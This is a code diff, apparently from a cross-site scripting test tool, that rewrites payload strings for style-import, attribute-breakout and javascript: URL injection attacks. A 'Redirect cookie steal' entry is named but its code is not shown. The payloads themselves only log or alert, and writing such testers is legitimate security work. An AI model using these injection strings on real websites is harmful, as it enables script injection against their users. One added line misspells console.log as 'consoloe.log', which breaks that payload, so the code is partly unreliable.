@@ -82,12 +82,12 @@ $(document).ready(function() {
 
   /* Style XSS Attack */
   attacks[2][1] = function(name) {
-    return "@import\"javascript:alert('"+name+" is vulnerable to a style attack.')\";"
+    return "@import\"javascript:console.log('"+name+" is vulnerable to a style attack.')\";"+js_debug(name);
   }
   
   /* Attribute attack */
   attacks[2][2] = function(name) {
-    return "\"><script>alert('"+name+" is vulnerable to an attribute attack.');</script>";
+    return "\"><script>console.log('"+name+" is vulnerable to an attribute attack.');"+js_debug(name)+"</script>";
   }
 
   /* Redirect cookie steal */
@@ -97,6 +97,6 @@ $(document).ready(function() {
 
   /* src/href attack */
   attacks[2][4] = function(name) {
-    return "javascript:alert('XSS')"
+    return "javascript:consoloe.log('"+name+"');alert('"+name+" is vulnerable to XSS.');"
   }
 });
